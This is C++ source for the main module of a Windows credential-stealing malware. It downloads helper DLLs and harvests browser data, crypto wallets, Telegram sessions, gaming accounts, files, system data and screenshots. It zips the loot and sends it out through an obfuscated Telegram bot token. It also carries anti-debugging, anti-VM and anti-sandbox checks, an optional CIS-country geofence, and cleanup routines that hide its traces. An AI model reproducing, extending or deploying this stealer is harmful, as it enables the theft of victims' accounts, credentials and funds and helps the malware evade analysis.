#include "module.h"

#include <windows.h>
#include <iostream>
#include <sstream>
#include <thread>
#include <filesystem>
#include <algorithm>
#include <b64/b64.h>
#include <map>

#include "../lambda.h"
#include "../bot/bot.h"
#include "../winapi/winapi.h"

#include "../work/telegram/telegram.h"
#include "../work/wallets/wallets.h"
#include "../work/utilities/utilities.h"
#include "../work/screenshot/screenshot.h"
#include "../work/browsers/browsers.h"
#include "../work/gaming/gaming.h"
#include "../work/grabbing/grabbing.h"
#include "../work/system_data/system_data.h"
#include "../work/geolocation/geolocation.h"

#include "../utilities/zip_handle/zip_handle.h"
#include "../utilities/xor/xor.h"
#include "../utilities/tools/tools.h"
#include "../utilities/directories/directories.h"
#include "../utilities/globals/globals.h"
#include "../depository/minizip/zip.h"
#include "../depository/json/json.h"
#include "../security/security.h"

module g_module;

static int load_module(const std::vector<std::string> data)
{
	if (g_tools.check_directory(data[0].c_str()) == FILE_FOUNDED)
		return 1;

	g_tools.download_file(data[1].c_str(), data[0].c_str());

	if (g_tools.check_directory(data[0].c_str()) != FILE_FOUNDED)
		g_winapi.ExitProcess(1);
}

void module::anti_cis()
{
	if (g_geolocation.m_country_code == std::string(XOR_STRING("RU"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("BY"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("KZ"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("UA"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("MD"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("TJ"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("UZ"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("AR"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("AZ"))) {
		g_winapi.ExitProcess(0);
	}
	else if (g_geolocation.m_country_code == std::string(XOR_STRING("KG"))) {
		g_winapi.ExitProcess(0);
	}
}

void module::run()
{
	srand(time(0));

	g_geolocation.get_geolocation();
	
	// anti_cis();
	// the program is terminated if the victim from any of the following countries:
	// ru, by, kz, ua, md, tj, uz, ar, kg

	std::string sqlite3_path = g_dir.get_temp() + std::string(XOR_STRING("sqlite3.dll"));
	std::string curl_path = g_dir.get_temp() + std::string(XOR_STRING("curl.dll"));

	load_module({ sqlite3_path, XOR_STRING(SQLITE_URL) });
	load_module({ curl_path, XOR_STRING(LIBCURL_URL) });

	g_globals.zip_filename = g_tools.random_string(64, 
		std::string(XOR_STRING("ABCDEFGHIKMNPRSVWXZ")) + std::string(XOR_STRING(".zip")));
	g_globals.zip_path = std::string(g_dir.get_temp() + g_globals.zip_filename);
	
	g_globals.sqlite_module = g_winapi._LoadLibraryA(sqlite3_path.c_str());
	g_globals.curl_module = g_winapi._LoadLibraryA(curl_path.c_str());

	g_zip.load_zip();
	{
		g_browsers.run();
		g_grabbing.run();
		g_wallets.run();
		g_tg.run();
		g_gaming.run();
		g_utilities.run();
		g_system_data.run();
		g_screenshot.run();
	}
	g_zip.close_zip();

	std::string m_hNewTelegramToken;
	std::string m_hNewTelegramID;

	std::string m_hTelegramToken = XOR_STRING(TELEGRAM_BOT_TOKEN_B64);
	std::string m_hTelegramID = XOR_STRING(TELEGRAM_ID_B64);

	g_b64.decode(m_hTelegramToken, m_hNewTelegramToken);
	g_b64.decode(m_hTelegramID, m_hNewTelegramID);

	g_tgbot.send_details(m_hNewTelegramToken, m_hNewTelegramID);

	g_winapi.FreeLibrary(g_globals.sqlite_module);
	g_winapi.FreeLibrary(g_globals.curl_module);
}

void module::delete_temporary_files()
{
	std::string curl_library = g_dir.get_temp() + std::string(XOR_STRING("curl.dll"));
	std::string sqlite3_library = g_dir.get_temp() + std::string(XOR_STRING("sqlite3.dll"));

	if (g_tools.check_directory(g_globals.zip_path.c_str()) == FILE_FOUNDED) {
		g_winapi.DeleteFileA(g_globals.zip_path.c_str());
	}

	if (g_tools.check_directory(curl_library.c_str()) == FILE_FOUNDED) {
		g_winapi.DeleteFileA(curl_library.c_str());
	}

	if (g_tools.check_directory(sqlite3_library.c_str()) == FILE_FOUNDED) {
		g_winapi.DeleteFileA(sqlite3_library.c_str());
	}
}

static void CreateInitializator(lambda_function* Functions)
{
	Functions->Add<void>(XOR_STRING("I"), []() { if (g_globals.m_security_finished) g_module.run(); });
	Functions->Add<void>(XOR_STRING("IW"), []() { g_module.delete_temporary_files(); });
}

static void CreateSecurityFunctions(lambda_function* Functions)
{
	g_globals.m_security_finished = FALSE;

	Functions->Add<void>(XOR_STRING("II"), []()
	{
		mouse_interaction_input_check();
		anti_analysis();
		anti_user_debugging();
		anti_vm_modules();
		anti_virustotal_dirs();
		check_remote_debugger_present();
		check_is_debugger_present();
		anti_virustotal_computernames();
	});

	g_globals.m_security_finished = TRUE;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{

	auto ISec = []() -> void
	{
		lambda_function* m_hSecurityFunctions = new lambda_function;
		CreateSecurityFunctions(m_hSecurityFunctions);

		m_hSecurityFunctions->Call(XOR_STRING("II"));

		delete m_hSecurityFunctions;
	};

	ISec();

	auto I = []() -> void
	{
		lambda_function* m_hFunctions = new lambda_function;
		CreateInitializator(m_hFunctions);

		while (!g_winapi.InternetCheckConnectionA(XOR_STRING("http://www.example.com"), 1, 0))
			g_winapi.Sleeping(0xBB8);

		m_hFunctions->Call(XOR_STRING("I"));
		m_hFunctions->Call(XOR_STRING("IW"));

		delete m_hFunctions;
	};

	I();

	return EXIT_SUCCESS;
}